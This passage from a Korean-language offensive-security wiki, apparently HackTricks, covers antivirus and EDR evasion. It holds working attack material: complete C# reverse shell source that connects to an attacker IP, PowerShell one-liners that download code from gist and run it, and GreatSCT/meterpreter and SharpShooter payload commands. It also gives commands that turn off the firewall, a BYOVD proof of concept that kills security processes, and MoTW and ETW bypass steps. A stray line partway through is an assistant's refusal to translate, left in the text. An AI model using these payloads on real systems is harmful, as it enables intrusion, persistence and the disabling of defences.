3.  Proxy-call stripping – ConfuserEx는 decompilation을 더 어렵게 만들기 위해 직접 메서드 호출을 경량 wrapper(a.k.a *proxy calls*)로 대체합니다. **ProxyCall-Remover**로 제거합니다:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   이 단계를 거치면 불투명한 wrapper 함수(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String` 또는 `AES.Create()`와 같은 일반적인 .NET API가 표시됩니다.

4.  수동 정리 – 결과 바이너리를 dnSpy에서 실행하고, 큰 Base64 blob 또는 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색해 *실제* payload를 찾습니다. malware는 종종 `<Module>.byte_0` 내부에 초기화된 TLV 인코딩 byte array로 이를 저장합니다.

위 체인은 악성 샘플을 실행하지 않고도 실행 흐름을 복원합니다. 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 샘플을 자동으로 분류할 때 IOC로 사용할 수 있는 `ConfusedByAttribute`라는 custom attribute를 생성합니다.

#### 한 줄 명령
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)과 tamper-proofing을 통해 소프트웨어 보안을 강화할 수 있는 [LLVM](http://www.llvm.org/) 컴파일 도구 모음의 오픈 소스 포크를 제공하는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 외부 도구를 사용하거나 컴파일러를 수정하지 않고, `C++11/14` 언어를 사용해 컴파일 시점에 obfuscated code를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming 프레임워크로 생성된 obfuscated operations 계층을 추가해 애플리케이션을 crack하려는 사람이 작업하기 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys를 포함한 다양한 PE 파일을 obfuscate할 수 있는 x64 binary obfuscator입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame은 임의의 실행 파일을 위한 간단한 metamorphic code 엔진입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)를 사용해 LLVM 지원 언어의 코드를 세밀하게 obfuscate하는 프레임워크입니다. ROPfuscator는 일반적인 명령어를 ROP chain으로 변환해 assembly code 수준에서 프로그램을 obfuscate하고, 정상적인 control flow에 대한 직관적인 이해를 방해합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 로드할 수 있습니다.

### LLVM 컴파일러 지원 함수별 self-masking

implant 전체를 잠자는 동안에만 masking하는 대신, 수정된 LLVM X86 backend를 사용하면 선택된 함수가 비활성 상태일 때마다 XOR-masked 상태를 유지할 수 있습니다. Function Peekaboo PoC는 이름이 demangle된 후 `REG_`를 포함하는 함수를 선택하고, 최종 machine code 주변에 position-independent entry/exit stub을 삽입하며, `.text`에 공유 masking handler 하나를 생성합니다. 소스 수준의 시그니처와 Windows x64 calling convention은 그대로 유지됩니다.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow 변환

이 작업은 instruction selection과 optimization 이후에 수행해야 합니다. 변환은 **모든 생성된 return을** 처리하고 정확한 x86 레이아웃을 알아야 하기 때문입니다. pre-emission `MachineFunctionPass`는 마지막 `MachineInstr::isReturn()`을 찾아 삭제하여 마지막 경로가 추가된 epilogue로 이어지게 하고, 그보다 앞선 return은 `JMP_1 handler`로 교체합니다. 각 return 앞에 컴파일러가 생성한 stack/frame 정리 코드가 있다면 유지하고, return 명령어 자체만 우회시킵니다.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()`와 `X86AsmPrinter::emitFunctionBodyEnd()`는 함수별 stub을 출력하고, `emitEndOfAsmFile()`은 handler를 출력합니다. 출력 단계 사이에 공유되는 심볼을 사용하면 prologue의 분기가 뒤에 출력될 epilogue를 가리킬 수 있습니다. 수동으로 near `je`를 출력할 때는 `0F 84` 뒤에 4바이트 MC expression `target - address_after_je`를 기록합니다. handler로 향하는 call과 jump는 `MCInst` 객체(`CALL64pcrel32`, `JMP_1`)로 출력할 수도 있습니다. 선택되지 않은 함수에서 아무것도 변경하지 않았다면 pass는 `false`를 반환해야 하지만, PoC는 이 경로에서 잘못 `true`를 반환합니다.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata와 pre-CRT 초기화

PoC는 XOR key와 loader가 재배치한 함수 포인터 및 runtime length를 담은 16바이트 레코드를 `.funcmeta`에 배치합니다. C 필드의 형식은 `uint32_t`지만 handler는 레코드 오프셋 `+8`에서 QWORD를 읽어 length와 padding을 함께 가져오고, 레코드 간격은 `0x10`으로 이동합니다. PE section 이름은 8바이트만 사용하므로 runtime lookup에서는 `.funcmet`으로 확인됩니다. 외부 patcher는 실행 가능한 `.stub`을 추가하고, 기존 entry-point RVA를 stub에 저장한 뒤 `AddressOfEntryPoint`를 변경합니다. PIC stub은 `gs:[0x60]` → `[PEB+0x10]`에서 image base를 가져오고, PE32+ imports를 순회해 이미 import된 `VirtualProtect`를 찾은 다음 CRT보다 먼저 실행됩니다.<sup>[[38]](#references)[[39]](#references)</sup>

초기화 과정은 `gs:[0xE8]`에 sentinel을 설정하고 metadata에 기록된 모든 함수를 호출합니다. 계속 읽을 수 있는 prologue는 함수 시작 주소를 `gs:[0xF0]`에 기록하고 sentinel을 확인한 다음, 아직 clear 상태인 본문을 건너뜁니다. 그 뒤 epilogue는 `call handler`를 사용합니다. handler가 13개 레지스터(`0x68`바이트)를 저장한 뒤에는 `[rsp+0x68]`의 return address가 변환된 함수의 끝을 가리키므로 `end - start`를 metadata 레코드에 기록할 수 있습니다. 모든 본문이 masking된 후 stub은 sentinel을 지우고 `ImageBase + original_entry_point_RVA`로 jump합니다.<sup>[[38]](#references)[[39]](#references)</sup>

일반적인 호출에서는 prologue가 동일한 대칭 handler를 호출해 본문을 decode합니다. 마지막 경로는 추가된 epilogue로 이어지고, 그보다 앞선 모든 return은 공유 handler로 바로 jump합니다. 일반적인 epilogue도 `call` 대신 `jmp handler`를 사용하므로, 다시 masking한 뒤 handler의 `ret`은 호출자의 원래 return address를 사용하고 함수 결과를 `RAX`에 그대로 보존합니다.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive와 분석 지표

handler는 현재 레코드를 찾고, 고정된 prologue(이 빌드에서는 `0x46`바이트)를 건너뛴 뒤 나머지 영역의 보호 속성을 `PAGE_EXECUTE_READWRITE`로 변경하고, 각 바이트를 key의 하위 바이트와 XOR한 다음 `PAGE_EXECUTE_READ`로 설정합니다. 따라서 동일한 루프가 진입 시에는 decode하고 정상 종료 시에는 encode합니다.<sup>[[38]](#references)[[39]](#references)</sup>

이 설계의 신뢰도 높은 지표는 다음과 같습니다.<sup>[[38]](#references)[[39]](#references)</sup>

- 실행 가능한 `.stub` 내부의 entry point와 key 및 재배치된 `.text` 포인터를 담은 `.funcmet` section
- pre-CRT 단계에서 이루어지는 PEB, import table, section table 파싱 및 이어지는 metadata 포인터별 호출
- 동일한 `call`/`pop` PIC prologue와 단일 handler로 우회되는 다수의 return 지점
- `gs:[0xE8]`, `gs:[0xF0]`, `gs:[0xF8]`에 대한 쓰기 이후 반복되는 `VirtualProtect` 전환 및 image-backed executable page에 대한 byte 단위 XOR 쓰기

이 방식은 memory-scanner 회피 기법이지, 암호학적 보호가 아닙니다. 패치된 파일에는 원래의 clear 본문이 그대로 들어 있으며, debugger에서 `VirtualProtect`나 XOR 루프에 breakpoint를 걸어 활성 함수를 덤프할 수 있습니다. 단일 바이트 XOR, 읽을 수 있는 metadata, 고정된 `0x46` 경계 때문에 오프라인 복구도 간단합니다.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC의 TEB 슬롯은 thread-local이지만 수정된 code page는 process-wide입니다. 따라서 동시 실행이나 재귀 호출이 발생하면 다른 호출이 실행 중인 동안 명령어가 다시 toggle될 수 있으며, exception이나 nonlocal exit가 발생하면 re-masking을 건너뛸 수도 있습니다. 견고하게 구현하려면 전환을 동기화하고, `lpflOldProtect`를 통해 반환된 실제 보호 속성을 복원하며, 하드코딩된 stub 길이를 피하고, x64 stack alignment를 고려해 `call`과 `jmp` 경로를 모두 점검하고, 실행 가능한 바이트를 다시 쓴 뒤 `FlushInstructionCache`를 호출해야 합니다. Microsoft는 실행 코드를 수정할 때 instruction-cache coherency를 보장할 책임이 호출자에게 있다고 명시합니다.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen 및 MoTW

인터넷에서 일부 실행 파일을 다운로드한 뒤 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 최종 사용자가 잠재적으로 악성인 애플리케이션을 실행하지 않도록 보호하는 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 방식으로 작동합니다. 즉, 자주 다운로드되지 않는 애플리케이션은 SmartScreen을 작동시켜 최종 사용자에게 경고하고 파일 실행을 차단합니다(단, More Info -> Run anyway를 클릭하면 파일을 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 Zone.Identifier라는 이름의 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)입니다. 인터넷에서 파일을 다운로드할 때 다운로드 출처 URL과 함께 자동으로 생성됩니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> **신뢰할 수 있는** 서명 인증서로 서명된 실행 파일은 **SmartScreen을 작동시키지 않습니다**.

payload에 Mark of The Web이 붙지 않도록 하는 매우 효과적인 방법은 ISO 같은 컨테이너에 payload를 넣는 것입니다. Mark-of-the-Web (MOTW)은 **NTFS가 아닌** 볼륨에는 적용할 수 **없기** 때문입니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 Mark-of-the-Web을 회피하기 위해 payload를 출력 컨테이너에 패키징하는 도구입니다.

사용 예시:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)를 사용해 payload를 ISO 파일 안에 패키징하여 SmartScreen을 우회하는 데모입니다.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows(ETW)는 Windows의 강력한 로깅 메커니즘으로, 애플리케이션과 시스템 구성 요소가 **이벤트를 기록**할 수 있도록 합니다. 하지만 보안 제품이 악성 활동을 모니터링하고 탐지하는 데도 사용할 수 있습니다.

AMSI를 비활성화(우회)하는 것과 마찬가지로, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수가 이벤트를 기록하지 않고 즉시 반환하도록 할 수도 있습니다. 이를 위해 메모리에서 함수를 패치해 즉시 반환하도록 하면 해당 프로세스의 ETW 로깅을 효과적으로 비활성화할 수 있습니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 및 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**에서 확인할 수 있습니다.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# 바이너리를 메모리에서 로드하는 방법은 오래전부터 알려져 왔으며, AV에 탐지되지 않고 post-exploitation 도구를 실행하는 데 여전히 매우 효과적입니다.

payload가 디스크에 쓰이지 않고 메모리에 직접 로드되므로, 전체 프로세스에서 AMSI를 패치하는 것만 신경 쓰면 됩니다.

대부분의 C2 프레임워크(sliver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# assembly를 메모리에서 직접 실행하는 기능을 제공합니다. 하지만 이를 수행하는 방법은 여러 가지입니다.

- **Fork\&Run**

**새로운 희생 프로세스를 생성**하고, 해당 프로세스에 post-exploitation 악성 코드를 주입해 실행한 다음, 작업이 끝나면 새 프로세스를 종료하는 방식입니다. 이 방법에는 장단점이 모두 있습니다. Fork and run 방식의 장점은 실행이 Beacon implant 프로세스 **외부에서** 이루어진다는 것입니다. 즉, post-exploitation 작업 중 문제가 생기거나 탐지되더라도 **implant가 살아남을 가능성이 훨씬 높습니다.** 단점은 **행위 기반 탐지(Behavioural Detections)**에 걸릴 가능성이 **더 높다**는 것입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation 악성 코드를 **자체 프로세스에** 주입하는 방식입니다. 따라서 새 프로세스를 생성하고 AV 검사를 받는 일을 피할 수 있습니다. 하지만 payload 실행에 문제가 생기면 프로세스가 충돌할 수 있어 **beacon을 잃을 가능성이 훨씬 높습니다.**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 알아보려면 이 글 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)과 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))를 확인하세요.

C# Assembly는 **PowerShell에서도** 로드할 수 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t의 동영상](https://www.youtube.com/watch?v=oe11Q-3Akuk)을 확인하세요.

## 다른 프로그래밍 언어 사용

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안한 것처럼, 침해된 시스템이 **Attacker Controlled SMB share에 설치된 인터프리터 환경에** 접근하도록 하면 다른 언어로 악성 코드를 실행할 수 있습니다.

SMB share의 Interpreter Binaries와 환경에 접근할 수 있도록 하면, 침해된 시스템의 메모리 안에서 해당 언어로 **임의의 코드를 실행할 수 있습니다.**

저장소에 따르면 Defender는 여전히 스크립트를 검사하지만 Go, Java, PHP 등을 사용하면 **정적 시그니처를 우회할 유연성이 커집니다.** 난독화되지 않은 임의의 reverse shell 스크립트를 이러한 언어로 테스트한 결과 성공적이었다고 합니다.

## TokenStomping

Token stomping은 EDR이나 AV 같은 보안 제품의 access token을 조작합니다. token의 권한을 낮추면 프로세스는 계속 실행되면서 권한이 필요한 검사나 대응 조치를 수행하지 못하게 할 수 있습니다.

이를 방지하려면 Windows에서 **외부 프로세스가** 보안 프로세스의 token 핸들을 가져오지 못하도록 할 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 신뢰할 수 있는 소프트웨어 사용

### Chrome Remote Desktop

[**이 블로그 게시물**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에 설명된 것처럼, 피해자의 PC에 Chrome Remote Desktop을 배포한 뒤 이를 사용해 장악하고 persistence를 유지하는 것은 간단합니다.<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ 에서 다운로드하고 "Set up via SSH"를 클릭한 다음, Windows용 MSI 파일을 클릭해 다운로드합니다.
2. 피해자 시스템에서 설치 프로그램을 조용히 실행합니다(관리자 권한 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가 Next를 클릭합니다. 그러면 마법사에서 권한 부여를 요청합니다. Authorize 버튼을 클릭해 계속 진행합니다.
4. 필요한 부분을 수정해 제공된 명령을 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` 매개변수는 GUI를 사용하지 않고 PIN을 설정합니다.)
 

## 고급 Evasion

Evasion은 매우 복잡한 주제입니다. 때로는 단일 시스템에서 여러 원격 측정 데이터를 고려해야 하므로, 보안이 잘 갖춰진 환경에서 완전히 탐지되지 않는 것은 사실상 불가능합니다.

공격 대상 환경마다 고유한 강점과 약점이 있습니다.

더 고급 Evasion 기법을 익히기 위한 출발점으로 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 발표를 꼭 시청해 보세요.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

[@mariuszbit](https://twitter.com/mariuszbit)의 이 발표도 Evasion in Depth에 관한 훌륭한 자료입니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **이전 기법**

### **Defender가 악성으로 판단하는 부분 확인**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 **바이너리의 일부를 제거하면서** Defender가 악성으로 판단하는 부분을 **찾아내고 분리해 줍니다.**\
**같은 기능을 하는** 또 다른 도구는 [**avred**](https://github.com/dobin/avred)이며, [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 웹 서비스로 제공됩니다.

### **Telnet Server**

Windows 10 이전 버전의 모든 Windows에는 설치할 수 있는 **Telnet server**가 포함되어 있었습니다(관리자 권한 필요). 다음을 실행하면 됩니다.

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

시스템이 시작될 때 **시작**되도록 설정하고 지금 **실행**하세요:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet 포트 변경(stealth) 및 방화벽 비활성화:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

죄송하지만, stealth를 유지하며 victim에 reverse VNC 연결을 설정하는 구체적인 지침은 번역해 드릴 수 없습니다. 원하시면 방어·탐지 관점의 안전한 설명으로 바꿔 드릴 수 있습니다.

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT 내부:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

이제 `msfconsole -r file.rc`로 **lister**를 시작하고, 다음과 같이 **xml payload**를 **실행**합니다:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**현재 Defender는 프로세스를 매우 빠르게 종료합니다.**

### 자체 reverse shell 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일합니다:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

다음과 함께 사용하세요:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# 컴파일러 사용

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injector 빌드에 Python을 사용하는 예시:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### 더 보기

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 커널 공간에서 AV/EDR 종료하기

Storm-2603은 랜섬웨어를 설치하기 전에 엔드포인트 보호 기능을 비활성화하는 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 활용했습니다. 이 도구는 **자체 취약하지만 *서명된* 드라이버**를 가져와, Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 권한 있는 커널 작업을 수행하도록 악용합니다.<sup>[[12]](#references)</sup>

핵심 요점
1. **서명된 드라이버**: 디스크에 저장되는 파일은 `ServiceMouse.sys`이지만, 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된, 정식으로 서명된 드라이버 `AToolsKrnl64.sys`입니다. 이 드라이버는 유효한 Microsoft 서명을 보유하고 있으므로 Driver-Signature-Enforcement (DSE)가 활성화된 상태에서도 로드됩니다.
2. **서비스 설치**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   첫 번째 줄은 드라이버를 **커널 서비스**로 등록하고, 두 번째 줄은 드라이버를 시작하여 `\\.\ServiceMouse`를 user land에서 사용할 수 있게 합니다.
3. **드라이버가 노출하는 IOCTL**
   | IOCTL 코드 | 기능                                      |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID로 임의의 프로세스 종료 (Defender/EDR 서비스를 종료하는 데 사용) |
   | `0x990000D0` | 디스크의 임의 파일 삭제 |
   | `0x990001D0` | 드라이버 언로드 및 서비스 제거 |

   최소 C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **작동 원리**: BYOVD는 사용자 모드 보호를 완전히 우회합니다. 커널에서 실행되는 코드는 *보호된* 프로세스를 열거나 종료하고, PPL/PP, ELAM 또는 기타 강화 기능과 관계없이 커널 객체를 변조할 수 있습니다.

탐지 / 완화
•  Microsoft의 취약 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys`를 로드하지 못하게 합니다.
•  새 *커널* 서비스가 생성되는지 모니터링하고, 드라이버가 모든 사용자가 쓸 수 있는 디렉터리에서 로드되거나 허용 목록에 없는 경우 경고를 발생시킵니다.
•  사용자 모드 핸들이 사용자 지정 디바이스 객체에 연결된 뒤 의심스러운 `DeviceIoControl` 호출이 발생하는지 감시합니다.

### 디스크에 저장된 바이너리 패치로 Zscaler Client Connector Posture Check 우회

Zscaler의 **Client Connector**는 디바이스 posture 규칙을 로컬에서 적용하고, Windows RPC를 사용해 다른 구성 요소에 결과를 전달합니다. 다음 두 가지 취약한 설계 선택으로 인해 완전한 우회가 가능합니다.

1. Posture 평가는 **전적으로 클라이언트 측에서** 이루어집니다 (서버로 boolean 값을 전송).
2. 내부 RPC 엔드포인트는 연결 프로그램이 Zscaler에서 **서명되었는지만** 확인합니다 (`WinVerifyTrust` 사용).<sup>[[11]](#references)</sup>

**디스크에 저장된 서명된 바이너리 네 개를 패치하면** 두 메커니즘 모두 무력화할 수 있습니다.

| Binary | 패치 전 로직 | 결과 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 검사를 통과한 것으로 처리 |
